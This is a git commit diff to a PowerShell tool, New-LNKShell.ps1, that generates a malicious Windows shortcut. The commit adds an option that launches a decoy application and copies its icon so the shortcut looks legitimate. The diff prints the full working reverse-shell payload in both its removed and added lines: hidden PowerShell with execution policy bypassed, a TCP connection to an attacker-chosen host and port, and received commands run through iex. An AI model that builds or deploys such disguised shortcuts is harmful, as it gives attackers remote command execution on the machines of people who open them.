7e6368a622a2c345f3100a96e7283da035e2ddd0
leesoh <liam@liso.ca>
2016-06-06 15:48:39 -0600

    Add support for launching executables in addition to reverse shell.

--- New-LNKShell.ps1
+++ New-LNKShell.ps1
@@ -16,6 +16,9 @@ Target for created shortcut. Defaults to current directory.
 .PARAMETER Filename
 Target filename. Must end in lnk. Defaults to 'payload.lnk'.
 
+.PARAMETER Run
+Application to run after launching. Will update shortcut icon to match. Defaults to none.
+
 .EXAMPLE
 PS> New-LNKShell -LHOST 192.168.1.1 -LPORT 4444
 #>
@@ -31,20 +34,22 @@ Param (
     [ValidateScript({$_.Substring($_.length -4) -eq '.lnk'})]
     [string]
     $Filename = 'payload.lnk',
+    [string]
+    $Run = '%SystemRoot%\System32\Shell32.dll,21',
     [ValidateScript({Test-Path -Path $_})]
     [string]
     $OutPath = (Join-Path -Path (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition) -ChildPath $Filename)
 )
 
 $Command = @"
-`$Client = New-Object System.Net.Sockets.TCPClient('$LHOST', $LPORT);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();
+$Run;`$Client = New-Object System.Net.Sockets.TCPClient('$LHOST', $LPORT);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();
 "@
 
 Write-Host "[*] Creating shortcut (${LHOST}:$LPORT)"
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($OutPath)
 $Shortcut.TargetPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe'
-$Shortcut.IconLocation = '%SystemRoot%\System32\Shell32.dll,21'
+$Shortcut.IconLocation = $Run
 $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Noprofile -Command $Command"
 $Shortcut.Save()
 Write-Host "[*] Shortcut created: $OutPath"
